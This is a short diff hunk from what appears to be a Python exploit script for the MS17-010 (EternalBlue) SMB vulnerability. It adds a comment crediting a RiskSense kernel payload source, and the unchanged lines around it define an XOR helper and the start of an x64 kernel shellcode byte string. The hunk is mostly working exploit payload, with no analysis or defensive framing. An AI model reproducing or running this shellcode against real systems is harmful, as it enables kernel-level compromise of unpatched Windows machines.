@@ -10,6 +10,13 @@ import socket
 def xor_encrypt(message, key):
 	return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(message, cycle(key)))
 
+'''
+https://github.com/RiskSense-Ops/MS17-010/blob/master/payloads/x64/src/exploit/kernel.asm  
+	Name: kernel  
+	Length: 1019 bytes
+	
+	Requires a userland payload size length to be added at the end 
+'''
 kernel_shellcode = b"\xB9\x82\x00\x00\xC0\x0F\x32\x48\xBB\xF8\x0F\xD0\xFF\xFF\xFF\xFF"
 kernel_shellcode += b"\xFF\x89\x53\x04\x89\x03\x48\x8D\x05\x0A\x00\x00\x00\x48\x89\xC2"
 kernel_shellcode += b"\x48\xC1\xEA\x20\x0F\x30\xC3\x0F\x01\xF8\x65\x48\x89\x24\x25\x10"
